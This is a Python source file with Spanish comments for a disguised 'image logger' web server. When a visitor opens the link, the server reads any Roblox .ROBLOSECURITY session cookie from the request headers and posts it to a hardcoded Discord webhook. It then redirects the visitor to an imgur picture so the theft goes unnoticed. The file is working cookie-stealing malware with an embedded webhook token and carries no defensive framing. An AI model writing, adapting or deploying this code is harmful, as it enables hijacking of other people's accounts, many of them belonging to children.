from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests

# Configura tu webhook de Discord aquí
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1279727533574721556/S9EZEtHNBHkuENyK54wzhQM3ziQOEAdxgxA6r4hf9DL8uPljR0gyePyeqPVBjmOE4PHk"
REDIRECT_IMAGE_URL = "https://i.imgur.com/UTwSor8.jpeg"

def get_roblosecurity_cookie(headers):
    if "Cookie" in headers:
        cookies = headers.get("Cookie")
        for cookie in cookies.split("; "):
            if cookie.startswith(".ROBLOSECURITY="):
                return cookie.split("=")[1]
    return None

def send_to_discord(cookie_value):
    payload = {
        "username": "ROBLOSECURITY Logger",
        "content": f"**.ROBLOSECURITY Cookie:**\n{cookie_value}"
    }
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            roblosecurity_cookie = get_roblosecurity_cookie(self.headers)
            
            if roblosecurity_cookie:
                send_to_discord(roblosecurity_cookie)
            
            # Redirige al usuario a la imagen
            self.send_response(302)
            self.send_header('Location', REDIRECT_IMAGE_URL)
            self.end_headers()
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')

def run(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting httpd on port {port}...')
    httpd.serve_forever()

if __name__ == "__main__":
    run()
